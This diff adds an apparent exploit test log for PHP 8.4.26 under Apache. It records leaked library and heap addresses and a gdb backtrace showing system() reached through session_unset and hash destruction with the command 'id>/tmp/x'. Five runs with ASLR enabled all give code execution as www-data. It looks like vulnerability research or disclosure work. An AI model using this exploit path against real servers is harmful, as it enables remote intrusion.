@@ -1,0 +1,23 @@
+=== FRESH START ===
+PARENT=691337 personality=00000000 WORKER=691339 personality=00000000
+7f37ede00000-7f37edf4f000 r--p 00000000 08:01 6554066                    /usr/lib/apache2/modules/libphp.so
+CHUNK_MAP=7f37ef800000-7f37efa00000 rw-p 00000000 00:00 0 
+--- leak ---
+libbase=0x7f37ede00000 chunkbase=0x7f37ef800000 S=0x7f37ef804640 zif_system=0x7f37ee23a870
+--- /tmp/x ---
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+--- gdb ---
+HIT zif_system rdi(execute_data)=0x7f37ef8046e0 rsi(return_value)=0x1
+arg1_str=id>/tmp/x
+#0  zif_system (execute_data=0x7f37ef8046e0, return_value=0x1) at /home/debian/php2shell/src/php-8.4.26/ext/standard/exec.c:260
+#1  0x00007f37ee3cbc9d in zend_hash_destroy (ht=ht@entry=0x7f37ef8046c0) at /home/debian/php2shell/src/php-8.4.26/Zend/zend_hash.c:1770
+#2  0x00007f37ee3cbff8 in zend_array_destroy (ht=0x7f37ef8046c0) at /home/debian/php2shell/src/php-8.4.26/Zend/zend_hash.c:1827
+#3  0x00007f37ee3cc20e in zend_hash_clean (ht=0x7f37ef803150) at /home/debian/php2shell/src/php-8.4.26/Zend/zend_hash.c:1920
+#4  0x00007f37ee1e976f in zif_session_unset (execute_data=<optimized out>, return_value=<optimized out>) at /home/debian/php2shell/src/php-8.4.26/ext/session/session.c:2771
+#5  zif_session_unset (execute_data=<optimized out>, return_value=<optimized out>) at /home/debian/php2shell/src/php-8.4.26/ext/session/session.c:2756
+=== RUN 5x (ASLR on) ===
+RUN 1 OK worker=691339 personality=00000000: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RUN 2 OK worker=691409 personality=00000000: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RUN 3 OK worker=691428 personality=00000000: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RUN 4 OK worker=691449 personality=00000000: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+RUN 5 OK worker=691468 personality=00000000: uid=33(www-data) gid=33(www-data) groups=33(www-data)
